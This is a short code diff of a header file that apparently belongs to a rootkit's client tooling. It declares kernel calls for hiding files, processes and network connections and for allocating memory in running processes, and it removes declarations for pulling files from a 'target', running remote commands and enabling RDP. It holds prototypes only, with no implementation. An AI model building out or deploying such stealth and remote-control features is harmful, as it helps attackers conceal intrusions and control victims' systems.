@@ -14,10 +14,5 @@ namespace DriverCalls {
 	int AllocSpecKernelCall(SOCKET ClientToServerSocket, ROOTKIT_MEMORY* RootkInst, char* ModuleName, HANDLE* PipeHandle, LogFile* MediumLog);  // Allocate specific memory region in memory of a certain running process (and keep it running)
 	int HideFileKernelCall(SOCKET ClientToServerSocket, ROOTKIT_MEMORY* RootkInst, char* ModuleName, HANDLE* PipeHandle, LogFile* MediumLog);  // Dynamically hide specific files/folders
 	int HideProcessKernelCall(SOCKET ClientToServerSocket, ROOTKIT_MEMORY* RootkInst, char* ModuleName, HANDLE* PipeHandle, LogFile* MediumLog);  // Dynamically hide processes
-	int HidePortCommunicationKernelCall(SOCKET ClientToServerSocket, ROOTKIT_MEMORY* RootkInst, char* ModuleName, HANDLE* PipeHandle, LogFile* MediumLog);  // Dynamically hide port connections
-}
-namespace RegularRequests {
-	int DownloadFileRequest(SOCKET ClientToServerSocket, ROOTKIT_MEMORY* RootkInst, char* FilePath, LogFile* MediumLog);  // Get file from target
-	int RemoteCommandRequest(SOCKET ClientToServerSocket, ROOTKIT_MEMORY* RootkInst, char* NakedCommand, LogFile* MediumLog);  // Execute command
-	int ActivateRDPRequest(SOCKET ClientToServerSocket, ROOTKIT_MEMORY* RootkInst, LogFile* MediumLog);  // Activate RDP server
+	int HideNetworkingKernelCall(SOCKET ClientToServerSocket, ROOTKIT_MEMORY* RootkInst, char* ModuleName, HANDLE* PipeHandle, LogFile* MediumLog);  // Dynamically hide port connections
 }
